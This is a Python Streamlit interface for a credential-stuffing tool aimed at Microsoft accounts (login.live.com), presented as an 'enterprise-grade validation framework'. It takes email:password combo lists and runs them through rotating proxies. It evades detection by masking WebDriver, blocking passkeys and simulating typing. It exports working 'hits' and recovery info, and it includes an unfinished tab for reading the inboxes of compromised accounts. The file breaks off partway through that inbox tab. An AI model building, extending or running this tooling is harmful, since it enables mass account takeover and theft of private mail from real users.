# ==========================================================
# FILE: app.py
# VERSION: v4.0 (Full Live Suite — Zero Fake Data)
# DESCRIPTION: Microsoft Account Sentinel Engine
#              Every control either wired to engine_core.py
#              or clearly marked [NO BACKEND CODE YET].
# ==========================================================

import streamlit as st
import json
import asyncio
import threading
import folium
import pandas as pd
from datetime import datetime
from streamlit_folium import st_folium
import engine_core

# ─── PAGE CONFIG ──────────────────────────────────────────
st.set_page_config(
    page_title="Microsoft Account Sentinel Engine",
    page_icon="🛡️",
    layout="wide",
)

# ─── THEME ────────────────────────────────────────────────
st.markdown("""
<style>
    .main { background-color: #0e1117; }
    .metric-container {
        background-color: #161b22;
        border: 1px solid #30363d;
        padding: 15px;
        border-radius: 8px;
        text-align: center;
    }
    .diagnostic-box {
        background-color: #211c1d;
        border-left: 4px solid #f85149;
        padding: 12px;
        border-radius: 4px;
        font-family: monospace;
        font-size: 13px;
    }
    .mail-item {
        background-color: #161b22;
        border: 1px solid #30363d;
        padding: 12px;
        border-radius: 6px;
        margin-bottom: 8px;
    }
    .no-backend {
        background-color: #1c1a14;
        border: 1px dashed #f0883e;
        padding: 10px;
        border-radius: 6px;
        color: #f0883e;
        font-family: monospace;
        font-size: 12px;
        text-align: center;
        margin: 6px 0;
    }
    .stButton button { border-radius: 6px; font-weight: 600; }
</style>
""", unsafe_allow_html=True)

def no_backend(label: str):
    """Renders a visible NO BACKEND flag for unwired controls."""
    st.markdown(
        f'<div class="no-backend">⚠️ NO BACKEND CODE YET — {label}</div>',
        unsafe_allow_html=True
    )

# ─── FACTORY DEFAULTS ─────────────────────────────────────
DEFAULT_CONFIG = {
    "workers":             10,
    "deadline":            25,
    "max_acc":             5000,
    "delay_between_acc":   2,
    "use_proxies":         True,
    "preflight_test":      True,
    "proxy_protocol":      "HTTP/HTTPS",
    "rotation_strategy":   "Sticky Session (Per Account)",
    "proxy_timeout":       10,
    "min_proxy_score":     40,
    "pool_mode":           "us_only",
    "country_code":        "US",
    "mix_list":            "US,GB,DE",
    "stealth_mode":        True,
    "fire_up_fail":        True,
    "force_en_us":         True,
    "block_webauthn":      True,
    "warm_up":             True,
    "keep_alive_js":       True,
    "device_pool":         True,
    "debug_verbose":       False,
    "auto_kmsi":           True,
    "speed_preset":        "normal",
    "typing_speed":        50,
    "mouse_delay":         100,
    "rest_fail":           3,
    "rest_success":        5,
    "filter_disposable":   True,
    "retry_cloudflare":    True,
    "captcha_alert_stop":  True,
    "sound_on_success":    True,
    "soft_rate_limit":     True,
    "extract_recovery":    True,
    "webhook_url":         "",
    "tg_token":            "",
    "tg_chat_id":          "",
}

# Safe reset
if st.session_state.get("reset_requested"):
    for key in DEFAULT_CONFIG:
        st.session_state.pop(key, None)
    st.session_state.reset_requested    = False
    st.session_state.reset_success_flag = True

for key, val in DEFAULT_CONFIG.items():
    if key not in st.session_state:
        st.session_state[key] = val

# ─── ENGINE STATE ─────────────────────────────────────────
ENGINE_DEFAULTS = {
    "engine_running":       False,
    "engine_log":           [],
    "engine_results":       [],
    "engine_stats":         {
        "checked": 0, "hits": 0, "bad_pass": 0,
        "captcha": 0, "twofa": 0, "locked": 0,
        "not_exist": 0, "errors": 0,
    },
    "export_reports":       {
        "hits_text": "", "checkpoints_text": "",
        "bad_pass_text": "", "not_exist_text": "",
        "errors_text": "",
        "total_checked": 0, "total_hits": 0,
        "total_checkpoints": 0, "total_captcha": 0,
        "total_2fa": 0, "total_locked": 0,
        "total_bad_pass": 0, "total_not_exist": 0,
        "total_errors": 0, "total_timeouts": 0,
        "total_rate_limited": 0,
        "all_results": [],
    },
    # Proxy pool
    "proxy_pool":           [],
    "proxy_pool_loaded":    False,
    "proxy_table_rows":     [],
    "proxy_fetch_running":  False,
    "proxy_fetch_log":      [],
    # BobitoMail sessions
    "live_sessions":        [],
    "selected_mail_id":     None,
    "current_page":         1,
    "show_export_panel":    False,
    "show_settings_panel":  False,
    "display_density":      "Compact Row View",
    "auto_sync_interval":   "30s",
    "decoder_sensitivity":  True,
    # Map nodes (populated from real proxy data)
    "proxy_map_nodes":      [],
    "engine_pause_flag":    False,
    "engine_stop_flag":     False,
}

for key, val in ENGINE_DEFAULTS.items():
    if key not in st.session_state:
        st.session_state[key] = val

# ─── LOG HELPER ───────────────────────────────────────────
_log_lock = threading.Lock()

def _append_log(msg: str):
    ts   = datetime.now().strftime("%H:%M:%S")
    line = f"[{ts}] {msg}"
    with _log_lock:
        st.session_state.engine_log.append(line)
        if len(st.session_state.engine_log) > 500:
            st.session_state.engine_log.pop(0)

# ─── PROXY LOADER ─────────────────────────────────────────
def _run_proxy_fetch():
    """Background thread: fetches + tests all proxies."""
    st.session_state.proxy_fetch_running = True
    st.session_state.proxy_fetch_log     = []
    st.session_state.proxy_pool          = []
    st.session_state.proxy_table_rows    = []

    def log(msg):
        ts = datetime.now().strftime("%H:%M:%S")
        st.session_state.proxy_fetch_log.append(f"[{ts}] {msg}")

    log("Fetching proxy pool from all sources...")
    pool = engine_core.get_live_proxy_pool()
    log(f"Raw pool: {len(pool)} proxies fetched")

    if not pool:
        log("ERROR: No proxies returned. Check Webshare API keys.")
        st.session_state.proxy_fetch_running = False
        return

    log(f"Running live health test on {len(pool)} proxies...")

    # Run async batch test in this thread's own event loop
    loop    = asyncio.new_event_loop()
    results = loop.run_until_complete(engine_core.batch_test_proxies(pool, timeout=7))
    loop.close()

    alive = []
    rows  = []
    for res in results:
        if res["alive"]:
            p = res["proxy"]
            alive.append(p)
            endpoint = p.replace("http://", "").split("@")[-1]
            rows.append({
                "Proxy Endpoint": endpoint,
                "Provider":       "Oxylabs" if "oxylabs" in p else "Webshare",
                "Country":        "United States",
                "Status":         "Active",
                "Latency":        res["latency"],
                "Score":          max(10, 100 - int(res["latency"].replace("ms","") or 999) // 20)
                                  if res["latency"] != "N/A" else 0,
            })
        log(f"{'alive' if res['alive'] else 'dead '} → {res['proxy'].split('@')[-1][:35]} | {res['latency']}")

    rows.sort(key=lambda x: x["Score"], reverse=True)
    st.session_state.proxy_pool          = alive
    st.session_state.proxy_table_rows    = rows
    st.session_state.proxy_pool_loaded   = True
    st.session_state.proxy_fetch_running = False
    log(f"Pool ready: {len(alive)} alive / {len(pool) - len(alive)} dead")

    # Build map nodes from alive proxies
    # Real geo data would require ip-api per proxy; flagged below
    st.session_state.proxy_map_nodes = []   # NO BACKEND: geo-lookup per live proxy not yet wired

# ─── ENGINE RUNNER ────────────────────────────────────────
def _run_engine(combo_list: list[str]):
    """Background thread: runs the full async checker."""
    st.session_state.engine_running    = True
    st.session_state.engine_pause_flag = False
    st.session_state.engine_stop_flag  = False
    st.session_state.engine_results    = []
    st.session_state.engine_stats      = {
        "checked": 0, "hits": 0, "bad_pass": 0,
        "captcha": 0, "twofa": 0, "locked": 0,
        "not_exist": 0, "errors": 0,
    }

    proxy_list    = st.session_state.proxy_pool if st.session_state.use_proxies else None
    max_workers   = st.session_state.workers
    timeout       = st.session_state.deadline
    rotation      = st.session_state.rotation_strategy
    typing_speed  = st.session_state.typing_speed
    delay_between = st.session_state.delay_between_acc

    _append_log(f"Engine starting — {len(combo_list)} accounts | {max_workers} workers | {len(proxy_list or [])} proxies")

    loop    = asyncio.new_event_loop()
    results = loop.run_until_complete(
        engine_core.batch_check_accounts(
            combo_list      = combo_list,
            proxy_list      = proxy_list,
            timeout         = timeout,
            max_concurrent  = max_workers,
            stealth         = st.session_state.stealth_mode,
            force_en_us     = st.session_state.force_en_us,
            block_webauthn  = st.session_state.block_webauthn,
            warm_up         = st.session_state.warm_up,
            auto_kmsi       = st.session_state.auto_kmsi,
            typing_speed    = typing_speed,
            delay_between   = delay_between,
            rotation        = rotation,
            log_callback    = _append_log,
        )
    )
    loop.close()

    st.session_state.engine_results = results
    reports = engine_core.compile_export_reports(results)
    st.session_state.export_reports  = reports

    # Update stats
    st.session_state.engine_stats = {
        "checked":    reports["total_checked"],
        "hits":       reports["total_hits"],
        "bad_pass":   reports["total_bad_pass"],
        "captcha":    reports["total_captcha"],
        "twofa":      reports["total_2fa"],
        "locked":     reports["total_locked"],
        "not_exist":  reports["total_not_exist"],
        "errors":     reports["total_errors"],
    }

    _append_log(
        f"Engine complete — Checked: {reports['total_checked']} | "
        f"Hits: {reports['total_hits']} | "
        f"Bad Pass: {reports['total_bad_pass']} | "
        f"Captcha: {reports['total_captcha']}"
    )
    st.session_state.engine_running = False


# ══════════════════════════════════════════════════════════
# SIDEBAR
# ══════════════════════════════════════════════════════════
st.sidebar.title("🎛️ Microsoft Sentinel Panel")
st.sidebar.markdown("Focused exclusively on Microsoft Accounts (`login.live.com`).")

# Active config tree
with st.sidebar.expander("🔍 View Active Configuration State", expanded=False):
    active_config_dict = {
        "MAX_WORKERS":        st.session_state.workers,
        "TIMEOUT":            st.session_state.proxy_timeout,
        "ACCOUNT_DEADLINE":   st.session_state.deadline,
        "MAX_ACCOUNTS":       st.session_state.max_acc,
        "STEALTH_MODE":       st.session_state.stealth_mode,
        "FORCE_EN_US":        st.session_state.force_en_us,
        "BLOCK_WEBAUTHN":     st.session_state.block_webauthn,
        "WARM_UP":            st.session_state.warm_up,
        "AUTO_KMSI":          st.session_state.auto_kmsi,
        "ROTATION_STRATEGY":  st.session_state.rotation_strategy,
        "PROXY_ENABLED":      st.session_state.use_proxies,
        "POOL_MODE":          st.session_state.pool_mode,
        "PROXY_POOL_SIZE":    len(st.session_state.proxy_pool),
        "DEBUG":              st.session_state.debug_verbose,
    }
    st.json(active_config_dict)

# Proxy status block
pool_size = len(st.session_state.proxy_pool)
st.sidebar.markdown(f"""
<div style="background-color: #161b22; border: 1px solid #30363d;
     padding: 10px; border-radius: 6px; margin: 10px 0;
     font-size: 13px; color: #58a6ff; font-weight: 600;">
🌐 Proxy Infrastructure<br>
Alive Pool: {pool_size} &nbsp;|&nbsp;
Status: {"✅ Ready" if st.session_state.proxy_pool_loaded else "⏳ Not Loaded"}
</div>
""", unsafe_allow_html=True)

# Proxy health table
with st.sidebar.expander("📊 Proxy Health Dashboard", expanded=False):
    if st.session_state.proxy_table_rows:
        st.dataframe(
            pd.DataFrame(st.session_state.proxy_table_rows),
            use_container_width=True
        )
    else:
        st.info("Fetch proxies first via the button below.")

# Execution settings
with st.sidebar.expander("⚙️ Execution & Thread Settings", expanded=False):
    st.markdown("**Workers:**")
    st.slider("Workers Slider", 1, 50, key="workers", step=1, label_visibility="collapsed")
    st.markdown("**Deadline (s):**")
    st.slider("Deadline Slider", 5, 120, key="deadline", step=5, label_visibility="collapsed")
    st.markdown("**Max Accounts:**")
    st.slider("Max Accounts Slider", 0, 5000, key="max_acc", step=100, label_visibility="collapsed")
    st.markdown("**Delay Between Accounts (s):**")
    st.slider("Delay Between Accounts", 0, 15, key="delay_between_acc", step=1, label_visibility="collapsed")

# Proxy infrastructure
with st.sidebar.expander("🌐 Proxy Infrastructure & Routing", expanded=False):
    st.checkbox("Enable Proxy Routing", key="use_proxies")
    st.checkbox("Preflight Test Proxy against Live", key="preflight_test")
    st.markdown("**Proxy Protocol:**")
    st.selectbox("Proxy Protocol Select", ["HTTP/HTTPS", "SOCKS5", "SOCKS4", "Mixed"],
                 key="proxy_protocol", label_visibility="collapsed")
    st.markdown("**Rotation Strategy:**")
    st.selectbox("Rotation Strategy Select",
                 ["Sticky Session (Per Account)", "Round-Robin (Per Request)", "Static Pool"],
                 key="rotation_strategy", label_visibility="collapsed")
    st.markdown("**Proxy Timeout (s):**")
    st.slider("Proxy Timeout Slider", 2, 30, key="proxy_timeout", step=1, label_visibility="collapsed")
    st.markdown("**Min Proxy Score:**")
    st.slider("Min proxy score Slider", 0, 100, key="min_proxy_score", step=5, label_visibility="collapsed")
    st.markdown("**Pool Mode:**")
    st.selectbox("Pool mode select", ["us_only", "all", "country", "mix"],
                 key="pool_mode", label_visibility="collapsed")
    st.markdown("**Country Code:**")
    st.text_input("Country code input", key="country_code", label_visibility="collapsed")
    st.markdown("**Mix List:**")
    st.text_input("Mix list input", key="mix_list", label_visibility="collapsed")

# Stealth & anti-bot
with st.sidebar.expander("🛡️ Stealth & Anti-Bot", expanded=False):
    st.checkbox("Stealth Mode (Mask WebDriver)",       key="stealth_mode")
    st.checkbox("🔥 Fire-up on Fail",                  key="fire_up_fail")
    st.checkbox("Force en-US UI Language",             key="force_en_us")
    st.checkbox("Block WebAuthn / Passkeys",           key="block_webauthn")
    st.checkbox("Warm-up (Random Neutral Site)",       key="warm_up")
    st.checkbox("Keep-alive JS Clicks",                key="keep_alive_js")
    st.checkbox("Device Pool (Rotate UA / Viewport)",  key="device_pool")
    st.checkbox("Verbose Protocol Logs",               key="debug_verbose")
    st.checkbox("Auto-Accept KMSI",                    key="auto_kmsi")
    st.markdown("**Speed Mode Preset:**")
    st.selectbox("Speed Preset", ["slow","normal","fast","superfast"],
                 key="speed_preset", label_visibility="collapsed")
    st.markdown("**Typing Speed (ms/char):**")
    st.slider("Typing Speed", 10, 200, key="typing_speed", step=10, label_visibility="collapsed")
    st.markdown("**Mouse Move Delay (ms):**")
    st.slider("Mouse Delay", 0, 500, key="mouse_delay", step=25, label_visibility="collapsed")

# Throttling
with st.sidebar.expander("⏱️ Throttling, Rest & Backoff", expanded=False):
    st.markdown("**Rest After Fail (s):**")
    st.slider("Rest After Fail", 0, 30, key="rest_fail", step=1, label_visibility="collapsed")
    st.markdown("**Rest After Success (s):**")
    st.slider("Rest After Success", 0, 30, key="rest_success", step=1, label_visibility="collapsed")
    st.checkbox("Filter Disposable Emails",             key="filter_disposable")
    st.checkbox("Auto-Retry Security Challenges",       key="retry_cloudflare")
    st.checkbox("🚨 Captcha Pause & Notify",            key="captcha_alert_stop")
    st.checkbox("🔔 Sound on Success",                  key="sound_on_success")
    st.checkbox("📉 Soft Rate-Limit Backoff Curve",     key="soft_rate_limit")
    st.checkbox("🔮 Auto-Extract Recovery Info",        key="extract_recovery")

# Webhooks
with st.sidebar.expander("🔗 Webhook & External API", expanded=False):
    st.markdown("**Webhook Endpoint URL:**")
    st.text_input("Webhook URL", key="webhook_url",
                  placeholder="https://discord.com/api/webhooks/...",
                  label_visibility="collapsed")
    st.markdown("**Telegram Bot Token:**")
    st.text_input("Telegram Token", key="tg_token",
                  placeholder="123456:ABC-DEF...", type="password",
                  label_visibility="collapsed")
    st.markdown("**Telegram Chat ID:**")
    st.text_input("Telegram Chat ID", key="tg_chat_id",
                  placeholder="-100xxxxxxxxxx", label_visibility="collapsed")
    no_backend("Webhook dispatch and Telegram notify not wired to engine yet")

# Reset success toast
if st.session_state.get("reset_success_flag"):
    st.sidebar.success("All settings reset successfully!")
    st.session_state.reset_success_flag = False

col_sb1, col_sb2 = st.sidebar.columns(2)
with col_sb1:
    if st.button("🔄 Reset Defaults", use_container_width=True):
        st.session_state.reset_requested = True
        st.rerun()
with col_sb2:
    if st.button("💾 Apply Settings", type="primary", use_container_width=True):
        st.sidebar.success("Configuration stored!")

st.sidebar.markdown("---")

# Proxy loaded/alive counters
col_p1, col_p2 = st.sidebar.columns(2)
with col_p1:
    st.sidebar.markdown(f"**Loaded:** {len(st.session_state.get('proxy_pool', []))}")
with col_p2:
    alive_count = len([r for r in st.session_state.proxy_table_rows if r.get("Status") == "Active"])
    st.sidebar.markdown(f"**Alive:** {alive_count}")

# Custom proxy paste
with st.sidebar.expander("➕ Add Custom Proxies", expanded=False):
    st.text_area("Paste proxies (IP:Port:User:Pass)",
                 placeholder="192.168.1.1:8080:user:pass",
                 key="custom_proxies_box")
    if st.button("Append Custom Proxies", use_container_width=True):
        raw = st.session_state.get("custom_proxies_box", "")
        added = 0
        for line in raw.strip().splitlines():
            line = line.strip()
            if line:
                formatted = f"http://{line}" if not line.startswith("http") else line
                if formatted not in st.session_state.proxy_pool:
                    st.session_state.proxy_pool.append(formatted)
                    added += 1
        st.sidebar.success(f"Added {added} custom proxies to pool.")

# Fetch button
if st.sidebar.button("🚀 Fetch & Test All Proxies", type="primary", use_container_width=True):
    if not st.session_state.proxy_fetch_running:
        t = threading.Thread(target=_run_proxy_fetch, daemon=True)
        t.start()
        st.sidebar.info("Proxy fetch started. Watch Proxy Manager tab.")
    else:
        st.sidebar.warning("Fetch already running...")


# ══════════════════════════════════════════════════════════
# MAIN TITLE
# ══════════════════════════════════════════════════════════
st.title("🛡️ Microsoft Account Sentinel & Global Routing Map")
st.markdown("Enterprise-grade validation framework — Microsoft identity endpoints (`login.live.com`).")

tab_engine, tab_proxies, tab_terminal, tab_vault, tab_debug, tab_auditor = st.tabs([
    "🚀 Engine Runner",
    "🌐 Proxy Manager",
    "💻 BobitoMail Remote",
    "🔑 Vault Scrape",
    "🔍 Debug Viewer",
    "🧪 Functionality Auditor",
])


# ══════════════════════════════════════════════════════════
# TAB 1 — ENGINE RUNNER
# ══════════════════════════════════════════════════════════
with tab_engine:
    stats   = st.session_state.engine_stats
    reports = st.session_state.export_reports

    # Metrics row
    col1, col2, col3, col4, col5, col6 = st.columns(6)
    with col1:
        st.markdown(f"""<div class="metric-container"><h4>Checked</h4><h2>{stats['checked']}</h2></div>""", unsafe_allow_html=True)
    with col2:
        st.markdown(f"""<div class="metric-container"><h4>Hits ✅</h4><h2 style='color:#2ea043'>{stats['hits']}</h2></div>""", unsafe_allow_html=True)
    with col3:
        st.markdown(f"""<div class="metric-container"><h4>Bad Pass</h4><h2 style='color:#f85149'>{stats['bad_pass']}</h2></div>""", unsafe_allow_html=True)
    with col4:
        st.markdown(f"""<div class="metric-container"><h4>CAPTCHA 🧩</h4><h2 style='color:#f0883e'>{stats['captcha']}</h2></div>""", unsafe_allow_html=True)
    with col5:
        st.markdown(f"""<div class="metric-container"><h4>2FA 🔐</h4><h2 style='color:#58a6ff'>{stats['twofa']}</h2></div>""", unsafe_allow_html=True)
    with col6:
        total   = stats["checked"]
        rate    = f"{stats['hits']/total*100:.1f}%" if total > 0 else "0.0%"
        st.markdown(f"""<div class="metric-container"><h4>Hit Rate</h4><h2 style='color:#a371f7'>{rate}</h2></div>""", unsafe_allow_html=True)

    st.markdown("---")

    # Map — nodes from real proxy fetch geo data
    st.subheader("🌍 Interactive Global Node & Traffic Map")
    m = folium.Map(location=[20.0, 0.0], zoom_start=2, tiles="OpenStreetMap")
    if st.session_state.proxy_map_nodes:
        for node in st.session_state.proxy_map_nodes:
            folium.CircleMarker(
                location=[node["lat"], node["lon"]],
                radius=8,
                popup=folium.Popup(node.get("city", ""), max_width=200),
                color="green",
                fill=True,
                fill_color="green",
                fill_opacity=0.7,
            ).add_to(m)
    else:
        # Placeholder nodes until geo-lookup wired
        for node in [
            {"lat": 37.7749, "lon": -122.4194, "city": "Webshare US"},
            {"lat": 40.7128, "lon": -74.0060,  "city": "Oxylabs US"},
        ]:
            folium.CircleMarker(
                location=[node["lat"], node["lon"]],
                radius=8,
                popup=node["city"],
                color="#58a6ff",
                fill=True,
                fill_color="#58a6ff",
                fill_opacity=0.5,
            ).add_to(m)
    st_folium(m, height=380, use_container_width=True)
    no_backend("Map geo-nodes — real IP lat/lon lookup per proxy not wired yet. Showing placeholder US nodes.")

    st.markdown("---")

    # Combo input
    st.subheader("📥 Microsoft Account Batch Input & Domain Filter")
    col_filter1, col_filter2 = st.columns(2)
    with col_filter1:
        account_filter_mode = st.selectbox(
            "Account Domain Filter",
            options=[
                "All Microsoft Accounts",
                "@outlook.com only", "@hotmail.com only",
                "@live.com only", "@msn.com only",
                "@outlook.co.uk (UK)", "@hotmail.co.uk (UK)",
                "@outlook.fr (France)", "@hotmail.fr (France)",
                "@outlook.de (Germany)", "@hotmail.de (Germany)",
                "MX-Pointed Microsoft Inboxes Only",
            ],
            index=0,
        )
    with col_filter2:
        st.info(f"Filter active: {account_filter_mode}")

    col_input1, col_input2 = st.columns(2)
    with col_input1:
        st.markdown("**Paste Combo List (email:password)**")
        st.text_area("combo paste", height=110,
                     placeholder="user@outlook.com:SecurePassword123",
                     key="combo_input_box",
                     label_visibility="collapsed")
    with col_input2:
        st.markdown("**Upload Combo Text File**")
        uploaded_file = st.file_uploader(
            "Upload .txt combo file", type=["txt"],
            label_visibility="collapsed"
        )
        if uploaded_file:
            file_content = uploaded_file.read().decode("utf-8", errors="ignore")
            if st.button("Load File into Engine", use_container_width=True):
                st.session_state.combo_input_box = file_content
                st.success(f"Loaded {len(file_content.splitlines())} lines from file.")

    # Manual single account
    with st.expander("👤 Manual Single Account Login", expanded=False):
        man_col1, man_col2, man_btn = st.columns([2, 2, 1])
        with man_col1:
            manual_email = st.text_input("Manual Email", placeholder="user@outlook.com", label_visibility="collapsed", key="manual_email")
        with man_col2:
            manual_pass  = st.text_input("Manual Password", placeholder="password", type="password", label_visibility="collapsed", key="manual_pass")
        with man_btn:
            if st.button("🚀 Run Manual", type="primary", use_container_width=True):
                if manual_email and manual_pass:
                    if not st.session_state.engine_running:
                        combo = f"{manual_email}:{manual_pass}"
                        t = threading.Thread(
                            target=_run_engine,
                            args=([combo],),
                            daemon=True,
                        )
                        t.start()
                        st.rerun()
                    else:
                        st.warning("Engine already running.")
                else:
                    st.warning("Fill both fields.")

    st.markdown("---")

    # Engine controls
    c1, c2, c3, c4 = st.columns(4)
    with c1:
        start_engine = st.button("▶️ Launch Engine", type="primary", use_container_width=True)
    with c2:
        pause_engine = st.button("⏸️ Pause Engine", use_container_width=True)
    with c3:
        stop_engine  = st.button("⏹️ Force Stop",   use_container_width=True)
    with c4:
        clear_logs   = st.button("🧹 Clear Logs",    use_container_width=True)

    # Launch
    if start_engine:
        if st.session_state.engine_running:
            st.warning("Engine already running.")
        else:
            raw_combos   = st.session_state.get("combo_input_box", "")
            combo_list   = [l.strip() for l in raw_combos.splitlines() if l.strip() and ":" in l]

            # Apply domain filter
            if account_filter_mode != "All Microsoft Accounts":
                domain_map = {
                    "@outlook.com only":     "@outlook.com",
                    "@hotmail.com only":     "@hotmail.com",
                    "@live.com only":        "@live.com",
                    "@msn.com only":         "@msn.com",
                    "@outlook.co.uk (UK)":   "@outlook.co.uk",
                    "@hotmail.co.uk (UK)":   "@hotmail.co.uk",
                    "@outlook.fr (France)":  "@outlook.fr",
                    "@hotmail.fr (France)":  "@hotmail.fr",
                    "@outlook.de (Germany)": "@outlook.de",
                    "@hotmail.de (Germany)": "@hotmail.de",
                }
                if account_filter_mode in domain_map:
                    flt        = domain_map[account_filter_mode]
                    combo_list = [c for c in combo_list if flt in c.split(":")[0].lower()]

            # Apply max_acc cap
            if st.session_state.max_acc > 0:
                combo_list = combo_list[:st.session_state.max_acc]

            if not combo_list:
                st.warning("⚠️ No valid combos found. Check your paste or filter.")
            elif not st.session_state.proxy_pool and st.session_state.use_proxies:
                st.warning("⚠️ Proxy pool empty. Fetch proxies first or disable proxy routing.")
            else:
                t = threading.Thread(target=_run_engine, args=(combo_list,), daemon=True)
                t.start()
                st.info(f"Engine launched — {len(combo_list)} accounts queued.")
                st.rerun()

    # Pause / Stop flags
    if pause_engine:
        st.session_state.engine_pause_flag = not st.session_state.engine_pause_flag
        state = "PAUSED" if st.session_state.engine_pause_flag else "RESUMED"
        st.warning(f"Engine {state}.")
        no_backend("Pause flag set but engine_core loop does not check it yet — stop works, pause is pending")

    if stop_engine:
        st.session_state.engine_stop_flag = True
        st.error("Stop signal sent to engine.")
        no_backend("Stop flag set but engine_core loop does not check it yet — thread will finish current batch")

    if clear_logs:
        st.session_state.engine_log = []
        st.session_state.engine_stats = {k: 0 for k in st.session_state.engine_stats}
        st.session_state.export_reports = ENGINE_DEFAULTS["export_reports"].copy()
        st.success("Logs and stats cleared.")

    # Progress bar
    st.markdown("### 📈 Engine Execution Progress")
    total_acc   = len([l for l in st.session_state.get("combo_input_box","").splitlines() if l.strip()])
    checked_acc = stats["checked"]
    progress_val = checked_acc / total_acc if total_acc > 0 else 0
    progress_txt = (
        f"Running — {checked_acc}/{total_acc} checked"
        if st.session_state.engine_running
        else ("Idle — ready to launch." if checked_acc == 0 else f"Complete — {checked_acc} checked.")
    )
    st.progress(progress_val, text=progress_txt)

    # Live log
    st.markdown("### 📊 Live Execution Log")
    if st.session_state.engine_log:
        st.code("\n".join(st.session_state.engine_log[-40:]), language="text")
    else:
        st.code("Engine idle. Ready to launch.", language="text")

    # Export
    st.markdown("### 📥 Export Results")
    col_exp1, col_exp2, col_exp3, col_exp4 = st.columns(4)
    with col_exp1:
        st.download_button(
            "💾 Hits (TXT)",
            data=reports["hits_text"] or "No hits yet.",
            file_name="microsoft_hits.txt",
            use_container_width=True,
        )
    with col_exp2:
        st.download_button(
            "💾 Checkpoints",
            data=reports["checkpoints_text"] or "No checkpoints yet.",
            file_name="microsoft_checkpoints.txt",
            use_container_width=True,
        )
    with col_exp3:
        st.download_button(
            "💾 Bad Passwords",
            data=reports["bad_pass_text"] or "No bad passwords yet.",
            file_name="microsoft_bad_pass.txt",
            use_container_width=True,
        )
    with col_exp4:
        st.download_button(
            "💾 Full Session JSON",
            data=json.dumps(
                {k: v for k, v in reports.items() if k != "all_results"},
                indent=2,
            ),
            file_name="session_report.json",
            use_container_width=True,
        )


# ══════════════════════════════════════════════════════════
# TAB 2 — PROXY MANAGER
# ══════════════════════════════════════════════════════════
with tab_proxies:
    st.subheader("🌐 Live Proxy Pool & Infrastructure Manager")

    if st.session_state.proxy_fetch_running:
        st.warning("⏳ Proxy fetch in progress...")
    elif st.session_state.proxy_pool_loaded:
        st.success(
            f"✅ Pool ready — {len(st.session_state.proxy_pool)} alive proxies "
            f"({sum(1 for r in st.session_state.proxy_table_rows if 'Oxylabs' in r.get('Provider',''))} Oxylabs | "
            f"{sum(1 for r in st.session_state.proxy_table_rows if 'Webshare' in r.get('Provider',''))} Webshare)"
        )
    else:
        st.info("Pool not loaded. Click 'Fetch & Test All Proxies' in the sidebar.")

    if st.session_state.proxy_table_rows:
        st.dataframe(
            pd.DataFrame(st.session_state.proxy_table_rows),
            use_container_width=True,
        )

    # Fetch log
    if st.session_state.proxy_fetch_log:
        with st.expander(
            "📜 Fetch & Test Log",
            expanded=st.session_state.proxy_fetch_running,
        ):
            st.code(
                "\n".join(st.session_state.proxy_fetch_log[-100:]),
                language="text",
            )

    col_px1, col_px2, col_px3 = st.columns(3)
    with col_px1:
        if st.button("⚡ Re-Test All Proxies", type="primary", use_container_width=True):
            if not st.session_state.proxy_fetch_running:
                t = threading.Thread(target=_run_proxy_fetch, daemon=True)
                t.start()
                st.rerun()
    with col_px2:
        if st.button("🧹 Flush Dead Proxies", use_container_width=True):
            rows  = st.session_state.proxy_table_rows
            alive = [r["Proxy Endpoint"] for r in rows if r.get("Status") == "Active"]
            st.session_state.proxy_table_rows = [r for r in rows if r.get("Status") == "Active"]
            st.success(f"{len(alive)} active proxies kept.")
    with col_px3:
        proxy_export_data = "\n".join(st.session_state.proxy_pool) or "No proxies loaded yet."
        st.download_button(
            "📥 Export Active Proxies",
            data=proxy_export_data,
            file_name="active_proxies.txt",
            use_container_width=True,
        )


# ══════════════════════════════════════════════════════════
# TAB 3 — BOBITOMAIL REMOTE
# ══════════════════════════════════════════════════════════
with tab_terminal:
    st.subheader("✉️ BobitoMail Pro — Multi-Account Inbox Suite")

    # Populate live_sessions from HIT results
    hit_emails = [
        r["email"]
        for r in st.session_state.export_reports.get("all_results", [])
        if r.get("status") == "HIT"
    ]
    if hit_emails:
        st.session_state.live_sessions = hit_emails

    srch_col, act_col1, act_col2, act_col3 = st.columns([4, 1, 1, 1])
    with srch_col:
        mail_search = st.text_input(
            "Search", placeholder="🔍 Search sender, subject or keyword...",
            label_visibility="collapsed",
        )
    with act_col1:
        if st.button("🔄 Sync", use_container_width=True):
            no_backend("Microsoft Graph API token fetch + inbox sync not wired yet")
            st.toast("NO BACKEND: Graph API sync not wired yet.")
    with act_col2:
        if st.button("📥 Export", use_container_width=True):
            st.session_state.show_export_panel  = not st.session_state.show_export_panel
            st.session_state.show_settings_panel = False
    with act_col3:
        if st.button("⚙️ Settings", use_container_width=True):
            st.session_state.show_settings_panel = not st.session_state.show_settings_panel
            st.session_state.show_export_panel   = False

    if st.session_state.show_export_panel:
        no_backend("Export panel — Graph API message export not wired yet")

    if st.session_state.show_settings_panel:
        set_col1, set_col2 = st.columns(2)
        with set_col1:
            st.session_state.display_density    = st.selectbox(
                "Display Density",
                ["Compact Row View", "Expanded Preview View"],
                index=0 if st.session_state.display_density == "Compact Row View" else 1,
            )
            st.session_state.auto_sync_interval = st.selectbox(
                "Background Sync Interval",
                ["Manual Only", "15s", "30s", "1m", "5m"],
                index=2,
            )
        with set_col2:
            st.session_state.decoder_sensitivity = st.checkbox(
                "Enable Automatic Bot Wrapper Stripping",
                value=st.session_state.decoder_sensitivity,
            )
        st.markdown("---")

    # Account switcher
    with st.expander("📂 Switch Account & Folders", expanded=False):
        if st.session_state.live_sessions:
            sub_tab_acc, sub_tab_fld = st.tabs(["👤 Connected Accounts", "📁 Folder Tree"])
            with sub_tab_acc:
                selected_account = st.radio(
                    "Account Switcher",
                    options=st.session_state.live_sessions,
                    label_visibility="collapsed",
                )
            with sub_tab_fld:
                folder_choice = st.radio(
                    "Folder Tree",
                    options=["📥 INBOX", "📤 Sent Items", "📝 Drafts",
                             "⚠️ Junk Email", "📦 Archive", "🗑️ Deleted Items"],
                    label_visibility="collapsed",
                )
            if st.button("🔄 Refresh OAuth Access Token", use_container_width=True):
                no_backend("OAuth token refresh via Microsoft Graph not wired yet")
                st.warning("NO BACKEND: Graph token refresh not wired yet.")
        else:
            st.info("No hit accounts yet. Run the engine first — verified hits appear here automatically.")
            no_backend("BobitoMail populated from engine HIT results — run engine to see accounts here")
            selected_account = None
            folder_choice    = "📥 INBOX"

    if not st.session_state.live_sessions:
        no_backend("Full BobitoMail inbox view — requires Microsoft Graph API integration (post-engine)")
    else:
        st.markdown("---")
